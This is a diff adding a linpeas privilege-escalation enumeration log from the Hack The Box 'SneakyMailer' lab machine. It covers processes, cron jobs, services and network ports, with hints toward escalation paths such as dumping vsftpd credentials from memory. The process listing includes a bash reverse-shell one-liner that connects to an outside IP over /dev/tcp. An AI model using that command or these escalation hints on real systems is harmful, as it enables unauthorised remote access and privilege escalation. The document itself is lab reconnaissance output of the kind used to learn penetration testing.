@@ -1,0 +1,1441 @@
+root@kali:~/CTF/HTB/SneakyMailer/PE# cat linpeas.txt
+ Starting linpeas. Caching Writable Folders...
+
+                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
+      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
+  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
+  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄
+  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄
+   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
+        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+    linpeas v2.9.4 by carlospolop
+
+ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
+
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
+ LEGEND:
+  RED/YELLOW: 95% a PE vector
+  RED: You must take a look at it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
+  LightMangeta: Your username
+
+
+====================================( Basic information )=====================================
+OS: Linux version 4.19.0-9-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.118-2 (2020-04-29)
+User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Hostname: sneakymailer
+Writable folder: /dev/shm
+[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+[+] /usr/bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
+
+
+Caching directories . . . . . . . . . . . . . . . . . . . . . . . DONE
+====================================( System Information )====================================
+[+] Operative system
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
+Linux version 4.19.0-9-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.118-2 (2020-04-29)
+Distributor ID: Debian
+Description:    Debian GNU/Linux 10 (buster)
+Release:        10
+Codename:       buster
+
+[+] Sudo version
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
+Sudo version 1.8.27
+
+[+] PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+[+] Date
+Fri Feb 26 14:00:30 EST 2021
+
+[+] System stats
+Filesystem      Size  Used Avail Use% Mounted on
+udev            2.0G     0  2.0G   0% /dev
+tmpfs           395M   45M  350M  12% /run
+/dev/sda1       5.9G  2.0G  3.6G  36% /
+tmpfs           2.0G     0  2.0G   0% /dev/shm
+tmpfs           5.0M     0  5.0M   0% /run/lock
+tmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup
+              total        used        free      shared  buff/cache   available
+Mem:        4041476      168192     3462520       48540      410764     3547928
+Swap:       2095100           0     2095100
+
+[+] CPU info
+Architecture:        x86_64
+CPU op-mode(s):      32-bit, 64-bit
+Byte Order:          Little Endian
+Address sizes:       43 bits physical, 48 bits virtual
+CPU(s):              2
+On-line CPU(s) list: 0,1
+Thread(s) per core:  1
+Core(s) per socket:  1
+Socket(s):           2
+NUMA node(s):        1
+Vendor ID:           AuthenticAMD
+CPU family:          23
+Model:               49
+Model name:          AMD EPYC 7302P 16-Core Processor
+Stepping:            0
+CPU MHz:             2994.375
+BogoMIPS:            5988.75
+Hypervisor vendor:   VMware
+Virtualization type: full
+L1d cache:           32K
+L1i cache:           32K
+L2 cache:            512K
+L3 cache:            131072K
+NUMA node0 CPU(s):   0,1
+Flags:               fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt clwb sha_ni xsaveopt xsavec xsaves clzero arat overflow_recov succor
+
+[+] Environment
+[i] Any private information inside environment variables?
+HISTFILESIZE=0
+USER=www-data
+SHLVL=2
+HOME=/var/www
+PS1=\[\e]0;\u@\h: \w\a\]\[\033[01;32m\]\u@\h\[\033[01;34m\] \w\$\[\033[00m\]
+LC_CTYPE=C.UTF-8
+_=./linpeas.sh
+TERM=xterm
+HISTSIZE=0
+SHELL=bash
+HISTFILE=/dev/null
+LS_OPTIONS=--color=auto
+
+[+] Searching Signature verification failed in dmseg
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed
+ Not Found
+
+[+] AppArmor enabled? .............. You do not have enough privilege to read the profile set.
+apparmor module is loaded.
+[+] grsecurity present? ............ grsecurity Not Found
+[+] PaX bins present? .............. PaX Not Found
+[+] Execshield enabled? ............ Execshield Not Found
+[+] SELinux enabled? ............... sestatus Not Found
+[+] Is ASLR enabled? ............... Yes
+[+] Printer? ....................... lpstat Not Found
+[+] Is this a virtual machine? ..... Yes (vmware)
+[+] Is this a container? ........... No
+[+] Any running containers? ........ No
+
+
+=========================================( Devices )==========================================
+[+] Any sd*/disk* disk in /dev? (limit 20)
+disk
+sda
+sda1
+sda2
+sda5
+
+[+] Unmounted file-system?
+[i] Check if you can mount umounted devices
+UUID=7be9a18c-25fc-4605-9613-3d2abdbb1f0d /               ext4    errors=remount-ro 0       1
+UUID=4fd0d531-4d66-43e6-adec-ce176694239b none            swap    sw              0       0
+/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0
+
+
+====================================( Available Software )====================================
+[+] Useful software
+/usr/bin/nc
+/usr/bin/netcat
+/usr/bin/nc.traditional
+/usr/bin/wget
+/usr/bin/curl
+/usr/bin/ping
+/usr/bin/gcc
+/usr/bin/g++
+/usr/bin/make
+/usr/bin/base64
+/usr/bin/python
+/usr/bin/python2
+/usr/bin/python3
+/usr/bin/python2.7
+/usr/bin/python3.7
+/usr/bin/perl
+/usr/bin/php
+/usr/bin/sudo
+
+[+] Installed Compiler
+ii  g++                                4:8.3.0-1                           amd64        GNU C++ compiler
+ii  g++-8                              8.3.0-6                             amd64        GNU C++ compiler
+ii  gcc                                4:8.3.0-1                           amd64        GNU C compiler
+ii  gcc-8                              8.3.0-6                             amd64        GNU C compiler
+/usr/bin/gcc
+/usr/bin/g++
+
+
+================================( Processes, Cron, Services, Timers & Sockets )================================
+[+] Cleaned processes
+[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+root         1  0.1  0.2 169404 10116 ?        Ss   12:02   0:11 /sbin/init
+root       359  0.3  0.3  48516 14668 ?        Ss   12:03   0:24 /lib/systemd/systemd-journald
+root       377  0.0  0.1  21924  4932 ?        Ss   12:03   0:00 /lib/systemd/systemd-udevd
+systemd+   493  0.0  0.1  93080  6552 ?        Ssl  12:03   0:00 /lib/systemd/systemd-timesyncd
+root       494  0.0  0.2  48220 10980 ?        Ss   12:03   0:00 /usr/bin/VGAuthService
+root       495  0.0  0.3 122856 12380 ?        Ssl  12:03   0:05 /usr/bin/vmtoolsd
+message+   564  0.0  0.1   9128  4344 ?        Ss   12:03   0:04 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+root       569  0.0  0.1  19768  5224 ?        Ss   12:03   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
+root       576  0.0  0.0   8504  2808 ?        Ss   12:03   0:00 /usr/sbin/cron -f
+root       580  0.0  0.1  19304  6476 ?        Ss   12:03   0:01 /lib/systemd/systemd-logind
+root       591  0.0  0.0   2284    80 ?        S    12:03   0:00 /usr/sbin/courierlogger -pid=/run/courier/authdaemon/pid -start /usr/lib/courier/courier-authlib/authdaemond
+root       592  0.0  0.0   6324  3580 ?        S    12:03   0:00  \_ /usr/lib/courier/courier-authlib/authdaemond
+root       604  0.0  0.0   7136  2272 ?        S    12:03   0:00      \_ /usr/lib/courier/courier-authlib/authdaemond
+root       605  0.0  0.0   7136  2272 ?        S    12:03   0:00      \_ /usr/lib/courier/courier-authlib/authdaemond
+root       606  0.0  0.0   7136  2272 ?        S    12:03   0:00      \_ /usr/lib/courier/courier-authlib/authdaemond
+root       607  0.0  0.0   7136  2272 ?        S    12:03   0:00      \_ /usr/lib/courier/courier-authlib/authdaemond
+root       608  0.0  0.0   7136  2272 ?        S    12:03   0:00      \_ /usr/lib/courier/courier-authlib/authdaemond
+root       685  0.0  0.0   2284    80 ?        S    12:03   0:00 /usr/sbin/courierlogger -pid=/run/courier/imapd.pid -start -name=imapd /usr/sbin/couriertcpd -address=0 -maxprocs=40 -maxperip=20 -access=/etc/courier/imapaccess.dat -nodnslookup -noidentlookup 143 /usr/lib/courier/courier/imaplogin /usr/bin/imapd Maildir
+root       688  0.0  0.0   4768  1920 ?        S    12:03   0:00  \_ /usr/sbin/couriertcpd -address=0 -maxprocs=40 -maxperip=20 -access=/etc/courier/imapaccess.dat -nodnslookup -noidentlookup 143 /usr/lib/courier/courier/imaplogin /usr/bin/imapd Maildir
+vmail     4248  0.0  0.1   8776  4244 ?        S    13:17   0:00      \_ /usr/bin/imapd /home/vmail/sneakymailer.htb/paulbyrd/
+root       695  0.0  0.0   2284    76 ?        S    12:03   0:00 /usr/sbin/courierlogger -pid=/run/courier/imapd-ssl.pid -start -name=imapd-ssl /usr/sbin/couriertcpd -address=0 -maxprocs=40 -maxperip=20 -access=/etc/courier/imapaccess.dat -nodnslookup -noidentlookup 993 /usr/bin/couriertls -server -tcpd -user=courier /usr/lib/courier/courier/imaplogin /usr/bin/imapd Maildir
+root       696  0.0  0.0   4768  1856 ?        S    12:03   0:00  \_ /usr/sbin/couriertcpd -address=0 -maxprocs=40 -maxperip=20 -access=/etc/courier/imapaccess.dat -nodnslookup -noidentlookup 993 /usr/bin/couriertls -server -tcpd -user=courier /usr/lib/courier/courier/imaplogin /usr/bin/imapd Maildir
+pypi       703  0.0  0.6  36804 25840 ?        Ss   12:03   0:05 /var/www/pypi.sneakycorp.htb/venv/bin/python3 /var/www/pypi.sneakycorp.htb/venv/bin/pypi-server -i 127.0.0.1 -p 5000 -a update,download,list -P /var/www/pypi.sneakycorp.htb/.htpasswd --disable-fallback -o /var/www/pypi.sneakycorp.htb/packages
+root       711  0.0  0.5 198404 21156 ?        Ss   12:03   0:00 php-fpm: master process (/etc/php/7.3/fpm/php-fpm.conf)
+www-data   740  0.0  0.3 198896 13224 ?        S    12:03   0:00  \_ php-fpm: pool www
+www-data   741  0.0  0.3 198896 13076 ?        S    12:03   0:00  \_ php-fpm: pool www
+www-data  5479  0.0  0.0   2388   756 ?        S    13:48   0:00      \_ sh -c bash -c 'bash -i >& /dev/tcp/10.10.14.78/443 0>&1'
+www-data  5481  0.0  0.0   3736  2840 ?        S    13:48   0:00          \_ bash -c bash -i >& /dev/tcp/10.10.14.78/443 0>&1
+www-data  5482  0.0  0.0   3868  3216 ?        S    13:48   0:00              \_ bash -i
+www-data  5536  0.0  0.2  17212  8520 ?        S    13:49   0:00                  \_ python3 -c import pty; pty.spawn("/bin/bash")
+www-data  5537  0.0  0.0   7192  3548 pts/0    Ss   13:49   0:00                      \_ /bin/bash
+www-data 18115  0.1  0.0   2700  1912 pts/0    S+   14:00   0:00                          \_ /bin/sh ./linpeas.sh -a
+www-data 18707  0.0  0.0   2700   508 pts/0    S+   14:00   0:00                          |   \_ /bin/sh ./linpeas.sh -a
+www-data 18720  0.0  0.0  11156  3312 pts/0    R+   14:00   0:00                          |   |   \_ ps faux
+www-data 18116  0.0  0.0   5492   744 pts/0    S+   14:00   0:00                          \_ tee linpeas.txt
+root       722  0.0  0.0   6620  2940 ?        Ss   12:03   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
+root       726  0.0  0.0   5612  1656 tty1     Ss+  12:03   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+root       730  0.0  0.1  15852  6592 ?        Ss   12:03   0:00 /usr/sbin/sshd -D
+root       739  0.0  0.0  70444  1840 ?        Ss   12:03   0:00 nginx: master process /usr/sbin/nginx -g daemon[0m on; master_process on;
+www-data   747  0.0  0.1  70728  7280 ?        S    12:03   0:00  \_ nginx: worker process
+www-data   748  0.0  0.1  70728  6020 ?        S    12:03   0:00  \_ nginx: worker process
+root      1016  0.0  0.1  43472  4444 ?        Ss   12:03   0:00 /usr/lib/postfix/sbin/master -w
+postfix   1020  0.0  0.2  44468  8272 ?        S    12:03   0:00  \_ qmgr -l -t unix -u
+postfix   2537  0.0  0.2  44004  9124 ?        S    12:36   0:00  \_ tlsmgr -l -t unix -u -c
+postfix   5278  0.0  0.1  43820  7508 ?        S    13:43   0:00  \_ pickup -l -t unix -u -c
+postfix  18628  0.0  0.1  43924  7592 ?        S    14:00   0:00  \_ cleanup -z -t unix -u -c
+postfix  18633  0.0  0.1  43832  7456 ?        S    14:00   0:00  \_ trivial-rewrite -n rewrite -t unix -u -c
+postfix  18639  0.0  0.1  43540  7288 ?        S    14:00   0:00  \_ local -t unix
+postfix  18645  0.0  0.1  43540  7412 ?        S    14:00   0:00  \_ local -t unix
+postfix  18646  0.0  0.1  43852  7508 ?        S    14:00   0:00  \_ bounce -z -t unix -u -c
+postfix  18647  0.0  0.1  43852  7540 ?        S    14:00   0:00  \_ bounce -z -t unix -u -c
+root      1017  0.0  0.1 225960  4856 ?        Ssl  12:03   0:05 /usr/sbin/rsyslogd -n -iNONE
+low       1088  0.0  0.5  29952 20856 ?        Ss   12:03   0:04 /home/low/venv/bin/python /opt/scripts/low/install-modules.py
+develop+ 18082  0.0  0.0   5260   680 ?        Ss   13:59   0:00 /bin/sleep 60
+vmail    18611  0.0  0.0   5260   736 ?        Ss   14:00   0:00 /bin/sleep 10
+vmail    18614  0.0  0.0   5260   680 ?        Ss   14:00   0:00 /bin/sleep 10
+
+[+] Binary processes permissions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+lrwxrwxrwx 1 root root       4 May 14  2020 /bin/sh -> dash
+-rwxr-xr-x 1 root root   39552 Feb 28  2019 /bin/sleep
+lrwxrwxrwx 1 low  low        7 May 16  2020 /home/low/venv/bin/python -> python3
+-rwxr-xr-x 1 root root  145488 Apr 27  2020 /lib/systemd/systemd-journald
+-rwxr-xr-x 1 root root  231560 Apr 27  2020 /lib/systemd/systemd-logind
+-rwxr-xr-x 1 root root   55360 Apr 27  2020 /lib/systemd/systemd-timesyncd
+-rwxr-xr-x 1 root root  678392 Apr 27  2020 /lib/systemd/systemd-udevd
+-rwxr-xr-x 1 root root   64744 Jan 10  2019 /sbin/agetty
+lrwxrwxrwx 1 root root      20 Apr 27  2020 /sbin/init -> /lib/systemd/systemd
+-rwxr-xr-x 1 root root 2851888 Mar 24  2020 /sbin/wpa_supplicant
+-rwxr-xr-x 1 root root  131360 Oct  9  2019 /usr/bin/VGAuthService
+-rwxr-xr-x 1 root root  240680 Jun  9  2019 /usr/bin/dbus-daemon[0m
+-rwxr-xr-x 1 root root  334008 Feb  5  2019 /usr/bin/imapd
+-rwxr-xr-x 1 root root   56808 Oct  9  2019 /usr/bin/vmtoolsd
+-rwxr-xr-x 1 root root   26704 Feb  2  2019 /usr/lib/courier/courier-authlib/authdaemond
+-rwxr-xr-x 1 root root   43096 Mar 16  2020 /usr/lib/postfix/sbin/master
+-rwxr-xr-x 1 root root   22856 Feb  2  2019 /usr/sbin/courierlogger
+-rwxr-xr-x 1 root root   72344 Feb  5  2019 /usr/sbin/couriertcpd
+-rwxr-xr-x 1 root root   55792 Oct 11  2019 /usr/sbin/cron
+-rwxr-xr-x 1 root root  702096 Feb 26  2019 /usr/sbin/rsyslogd
+-rwxr-xr-x 1 root root  807336 Jan 31  2020 /usr/sbin/sshd
+-rwxr-xr-x 1 root root  164104 Mar  6  2019 /usr/sbin/vsftpd
+lrwxrwxrwx 1 root pypi      16 May 14  2020 /var/www/pypi.sneakycorp.htb/venv/bin/python3 -> /usr/bin/python3
+
+[+] Processes with credentials in memory (root req)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory
+gdm-password Not Found
+gnome-keyring-daemon Not Found
+lightdm Not Found
+vsftpd process found (dump creds from memory as root)
+apache2 Not Found
+sshd Not Found
+
+[+] Different processes executed during 1 min (interesting is low number of repetitions)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#frequent-cron-jobs
+     18 /home/vmail/venv/bin/python /opt/scripts/vmail/imap-user-login.py
+      7 /home/vmail/venv/bin/python /opt/scripts/vmail/restore-sent-mail-box.py
+
+[+] Cron jobs
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
+-rw-r--r-- 1 root root 1042 Oct 11  2019 /etc/crontab
+
+/etc/cron.d:
+total 20
+drwxr-xr-x  2 root root 4096 May 14  2020 .
+drwxr-xr-x 87 root root 4096 Jun 22  2020 ..
+-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
+-rw-r--r--  1 root root  285 May 19  2019 anacron
+-rw-r--r--  1 root root  712 Dec 17  2018 php
+
+/etc/cron.daily:
+total 44
+drwxr-xr-x  2 root root 4096 Jun 22  2020 .
+drwxr-xr-x 87 root root 4096 Jun 22  2020 ..
+-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
+-rwxr-xr-x  1 root root  311 May 19  2019 0anacron
+-rwxr-xr-x  1 root root 1478 May 28  2019 apt-compat
+-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
+-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg
+-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate
+-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db
+-rwxr-xr-x  1 root root  543 Nov 14  2018 mlocate
+-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 May 14  2020 .
+drwxr-xr-x 87 root root 4096 Jun 22  2020 ..
+-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
+
+/etc/cron.monthly:
+total 16
+drwxr-xr-x  2 root root 4096 May 14  2020 .
+drwxr-xr-x 87 root root 4096 Jun 22  2020 ..
+-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
+-rwxr-xr-x  1 root root  313 May 19  2019 0anacron
+
+/etc/cron.weekly:
+total 20
+drwxr-xr-x  2 root root 4096 May 14  2020 .
+drwxr-xr-x 87 root root 4096 Jun 22  2020 ..
+-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
+-rwxr-xr-x  1 root root  312 May 19  2019 0anacron
+-rwxr-xr-x  1 root root  813 Feb 10  2019 man-db
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+HOME=/root
+LOGNAME=root
+
+1       5       cron.daily      run-parts --report /etc/cron.daily
+7       10      cron.weekly     run-parts --report /etc/cron.weekly
+@monthly        15      cron.monthly    run-parts --report /etc/cron.monthly
+
+[+] Services
+[i] Search for outdated versions
+ [ - ]  anacron
+ [ + ]  apparmor
+ [ - ]  bluetooth
+ [ - ]  console-setup.sh
+ [ + ]  courier-authdaemon
+ [ + ]  courier-imap
+ [ + ]  courier-imap-ssl
+ [ + ]  cron
+ [ + ]  dbus
+ [ - ]  hwclock.sh
+ [ - ]  keyboard-setup.sh
+ [ + ]  kmod
+ [ + ]  networking
+ [ + ]  nginx
+ [ + ]  open-vm-tools
+ [ + ]  php7.3-fpm
+ [ + ]  postfix
+ [ + ]  procps
+ [ + ]  rsyslog
+ [ - ]  screen-cleanup
+ [ + ]  ssh
+ [ - ]  sudo
+ [ + ]  udev
+ [ + ]  vsftpd
+
+[+] Systemd PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+[+] Analyzing .service files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
+You can't write on systemd PATH
+
+[+] System timers
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+NEXT                         LEFT       LAST                         PASSED       UNIT                         ACTIVATES
+Fri 2021-02-26 14:09:00 EST  7min left  Fri 2021-02-26 13:39:01 EST  22min ago    phpsessionclean.timer        phpsessionclean.service
+Fri 2021-02-26 14:30:27 EST  28min left Fri 2021-02-26 13:31:10 EST  30min ago    anacron.timer                anacron.service
+Fri 2021-02-26 21:55:48 EST  7h left    Fri 2021-02-26 12:03:04 EST  1h 58min ago apt-daily.timer              apt-daily.service
+Sat 2021-02-27 00:00:00 EST  9h left    Fri 2021-02-26 12:03:04 EST  1h 58min ago logrotate.timer              logrotate.service
+Sat 2021-02-27 00:00:00 EST  9h left    Fri 2021-02-26 12:03:04 EST  1h 58min ago man-db.timer                 man-db.service
+Sat 2021-02-27 06:42:04 EST  16h left   Fri 2021-02-26 12:03:04 EST  1h 58min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
+Sat 2021-02-27 12:18:01 EST  22h left   Fri 2021-02-26 12:18:01 EST  1h 43min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+
+[+] Analyzing .timer files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+
+[+] Analyzing .socket files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] HTTP sockets
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] D-Bus config files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+Possible weak user policy found on /etc/dbus-1/system.d/bluetooth.conf (  <policy group="bluetooth">
+  <policy group="lp">)
+Possible weak user policy found on /etc/dbus-1/system.d/wpa_supplicant.conf (        <policy group="netdev">)
+
+[+] D-Bus Service Objects list
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION
+:1.0                                   493 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service -          -
+:1.1                                     1 systemd         root             :1.1          init.scope                -          -
+:1.2                                   569 wpa_supplicant  root             :1.2          wpa_supplicant.service    -          -
+:1.3321                              29579 busctl          www-data         :1.3321       php7.3-fpm.service        -          -
+:1.5                                   580 systemd-logind  root             :1.5          systemd-logind.service    -          -
+fi.epitest.hostap.WPASupplicant        569 wpa_supplicant  root             :1.2          wpa_supplicant.service    -          -
+fi.w1.wpa_supplicant1                  569 wpa_supplicant  root             :1.2          wpa_supplicant.service    -          -
+org.bluez                                - -               -                (activatable) -                         -
+org.freedesktop.DBus                     1 systemd         root             -             init.scope                -          -
+org.freedesktop.hostname1                - -               -                (activatable) -                         -
+org.freedesktop.locale1                  - -               -                (activatable) -                         -
+org.freedesktop.login1                 580 systemd-logind  root             :1.5          systemd-logind.service    -          -
+org.freedesktop.network1                 - -               -                (activatable) -                         -
+org.freedesktop.resolve1                 - -               -                (activatable) -                         -
+org.freedesktop.systemd1                 1 systemd         root             :1.1          init.scope                -          -
+org.freedesktop.timedate1                - -               -                (activatable) -                         -
+org.freedesktop.timesync1              493 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service -          -
+
+
+===================================( Network Information )====================================
+[+] Hostname, hosts and DNS
+sneakymailer
+127.0.0.1       localhost pypi.sneakycorp.htb
+127.0.0.1       sneakycorp.htb
+127.0.1.1       debian
+
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+nameserver 8.8.8.8
+dnsdomainname Not Found
+
+[+] Content of /etc/inetd.conf & /etc/xinetd.conf
+/etc/inetd.conf Not Found
+
+[+] Interfaces
+default         0.0.0.0
+loopback        127.0.0.0
+link-local      169.254.0.0
+
+ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.10.10.197  netmask 255.255.255.0  broadcast 10.10.10.255
+        inet6 dead:beef::250:56ff:feb9:41a1  prefixlen 64  scopeid 0x0<global>
+        inet6 fe80::250:56ff:feb9:41a1  prefixlen 64  scopeid 0x20<link>
+        ether 00:50:56:b9:41:a1  txqueuelen 1000  (Ethernet)
+        RX packets 7164  bytes 904184 (882.9 KiB)
+        RX errors 0  dropped 22  overruns 0  frame 0
+        TX packets 8357  bytes 3490362 (3.3 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 90466  bytes 9918712 (9.4 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 90466  bytes 9918712 (9.4 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+[+] Networks and neighbours
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+default         10.10.10.2      0.0.0.0         UG    0      0        0 ens160
+10.10.10.0      0.0.0.0         255.255.255.0   U     0      0        0 ens160
+link-local      0.0.0.0         255.255.0.0     U     1000   0        0 ens160
+Address                  HWtype  HWaddress           Flags Mask            Iface
+10.10.10.2               ether   00:50:56:b9:75:a0   C                     ens160
+
+[+] Iptables rules
+iptables rules Not Found
+
+[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      747/nginx: worker p
+tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      747/nginx: worker p
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:48116         127.0.0.1:8080          TIME_WAIT   -
+tcp        0      0 127.0.0.1:48136         127.0.0.1:8080          TIME_WAIT   -
+tcp        0      0 127.0.0.1:56972         127.0.0.1:143           TIME_WAIT   -
+tcp        0      0 127.0.0.1:48184         127.0.0.1:8080          TIME_WAIT   -
+tcp        0      0 127.0.0.1:37732         127.0.0.1:5000          TIME_WAIT   -
+tcp        0      0 127.0.0.1:37828         127.0.0.1:5000          TIME_WAIT   -
